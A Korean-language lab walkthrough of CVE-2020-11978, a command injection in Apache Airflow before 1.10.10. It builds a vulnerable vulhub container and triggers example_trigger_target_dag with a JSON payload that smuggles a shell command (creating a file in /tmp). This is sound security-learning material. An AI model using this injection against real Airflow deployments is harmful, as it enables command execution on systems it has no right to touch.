#CVE-2020-11978 - Apache Airflow
개요]
Apache Airflow는 Python 기반의 워크플로우 스케줄링 도구로, DAG(Directed Acyclic Graph)를 기반으로 작업을 정의하고 실행합니다.  
버전 1.10.10 이전에는 `example_trigger_target_dag` 내 사용자 입력값이 필터링되지 않아, **명령어 인젝션(command injection)** 이 가능한 취약점이 발견되었습니다. 이 실습은 해당 취약점을 기반으로 취약한 컨테이너 환경을 구성하고, 공격 흐름을 직접 따라해보며 이해하는 데 목적이 있습니다.

실습 환경]
- Ubuntu 20.04 (VirtualBox 가상 머신)
- Docker + docker-compose
- Airflow 1.10.10 (vulhub 이미지 사용)

1. 취약 환경 구축]

vulhub 프로젝트를 클론한 뒤, Airflow 취약점 환경 디렉토리로 이동하여 컨테이너를 실행합니다.

git clone https://github.com/vulhub/vulhub.git

cd vulhub/airflow/CVE-2020-11978

sudo docker compose run airflow-init

sudo docker compose up -d


2. Airflow 관리 페이지 접속
브라우저에서 http://localhost:8080 접속하여 DAG 목록을 확인합니다.


3. 취약한 DAG 활성화 및 공격 시도
example_trigger_target_dag를 On으로 활성화하였습니다.


오른쪽 Trigger DAG 버튼을 클릭하였습니다.


그리고 다음과 같이 명령어 인젝션 페이로드를 입력하였습니다.
{"message":"'\";touch /tmp/airflow_dag_success;#"}

공격 시도 결과
sudo docker compose exec airflow-worker ls –l /tmp를 확인하면
`/tmp/airflow_dag_success` 파일이 생성되어 명령어 인젝션을 성공하게 됩니다.
